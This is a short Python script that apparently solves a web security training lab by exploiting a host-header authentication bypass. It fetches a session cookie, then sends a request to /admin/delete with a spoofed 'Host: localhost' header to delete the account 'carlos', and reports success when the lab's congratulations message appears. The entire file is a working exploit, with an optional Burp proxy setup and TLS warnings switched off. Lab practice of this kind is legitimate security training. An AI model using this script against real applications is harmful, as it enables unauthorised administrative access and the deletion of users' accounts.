import requests
from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    s.get(target_url, headers=headers, cookies=cookies)

def delete_user(s, url, path, username, headers={}, cookies={}):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=True, headers=headers, cookies=cookies)
    
    if 'User deleted successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.mount("https://", HostHeaderSSLAdapter())
    # s.proxies = proxies
    # s.verify = False
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_user = 'carlos'
    custom_headers = { 'Host': 'localhost' }

    goto(s, url, '/')
    session_cookies = s.cookies.get_dict()
    delete_user(s, url, '/admin/delete', target_user, custom_headers, session_cookies)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()